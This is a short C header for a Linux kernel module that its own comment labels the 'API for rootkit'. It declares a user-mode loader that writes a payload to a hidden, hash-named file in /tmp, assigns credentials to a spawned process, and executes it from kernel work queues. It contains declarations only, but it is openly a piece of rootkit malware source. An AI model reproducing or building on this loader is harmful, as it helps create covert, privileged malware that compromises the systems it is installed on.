#include <linux/kmod.h>
#include <linux/workqueue.h>

#ifndef USERLOADER_H
#define USERLOADER_H

#define FILE_PATH \
	"/tmp/9f4851118643e2045b4bfded9e0feec04b743e8130b0596def2645204b6cf1f8"

#define FILE_NAME \
	"9f4851118643e2045b4bfded9e0feec04b743e8130b0596def2645204b6cf1f8"

struct work_arg_struct {
	struct work_struct work;
	char *data;
};

// Internals
int _userloader_exec_init(struct subprocess_info *info, struct cred *new);
void _userloader_exec_task(struct work_struct *work);
int _userloader_write_payload(void);

// API for rootkit
void userloader_init(void);
void userloader_exec(void);

#endif